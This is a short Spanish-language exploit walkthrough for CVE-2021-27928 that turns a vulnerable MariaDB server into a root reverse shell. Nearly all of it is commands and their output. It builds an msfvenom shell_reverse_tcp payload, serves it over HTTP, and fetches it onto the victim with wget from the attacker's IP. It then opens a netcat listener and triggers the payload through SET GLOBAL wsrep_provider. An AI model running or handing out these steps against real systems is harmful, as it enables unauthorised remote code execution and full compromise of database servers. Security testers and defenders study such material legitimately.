CVE-2021-27928 (reverse shell en MariaDB)
Este exploit aprovecha una vulnerabilidad en las versiones (10.2 - 10.2.37) (10.3 - 10.3.28) (10.4 - 10.4.18) (10.5 - 10.5.9)

· Inicia MariaDB con el usuario y contraseña en la máquina victima para ver si la versión es vulnerable
 
    usuario@victima $ mysql -D database -u usuario -p password
    Welcome to the MariaDB monitor. Commands end with ; or \g.
    Server version: 10.3.25-MariaDB
     
    MariaDB [(none)]> 

· Si es vulnerable, ahora hay que crear un payload, recuerda poner la ip y puerto de tu máquina de atacante
   
    usuario@GatoGamer:~$ msfvenom -p linux/x64/shell_reverse_tcp LHOST=192.168.80.129 LPORT=443 -f elf-so -o CVE-2021-27928.so
    Payload size: of elf-so file: 476 bytes
    Saved ad: CVE-2021-27928.so

· Ahora que esta el payload hay que moverlo a la máquina victima en la carpeta /tmp, en mi caso compartire un servicio http en la carpeta donde esta el payload

    usuario@GatoGamer:~$ sudo python3 -m http.server 80
    Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...

· Ahora en la máquina victima me voy a descargar en la carpeta /tmp, recuerda poner tu ip de atacante a la hora de hacer la petición

    usuario@victima:~$ cd /tmp
    usuario@victima:~$ wget http://192.168.80.129/CVE-2021-27928.so
    Conectando con 192.168.80.129:80... conectado.
    Petición HTTP enviada, esperando respuesta... 200 OK
    Grabando a <<CVE-2021-27928.so>>
    CVE-2021-27928.so 100%[===========================================>] --.-KB/s en 0s
    <<CVE-2021-27928.so>> guardado [476/476]
    usuario@victima:~$

· Una vez tengas el payload en la máquina victima en la carpeta /tmp, debes ponerte en escucha en tu equipo por el puerto que especificaste al hacer el payload

    usuario@GatoGamer:~$ sudo netcat -lvnp 443
    listening on [any] 443 ...

· Ahora en la máquina victima en el MariaDB vulnerable hay que hacer que ejecute el payload, al ejecutar el comando te llegara una shell en el puerto que estas en escucha

    MariaDB [(none)]> SET GLOBAL wsrep_provider="/tmp/CVE-2021-27928.so";
    ERROR 2013 (HY000): Lost connection to MySQL server during query
    MariaDB [(none)]>

· Como complemento puedes obtener una consola un poco mas interactiva como una bash

    connect to [192.168.80,129] from (UNKNOWN) [192.168.80.129]
    script /dev/null -c bash
    Script started, ouput log file is '/dev/null'.
    root@GatoGamer:~# whoami
    root
    root@GatoGamer:~#
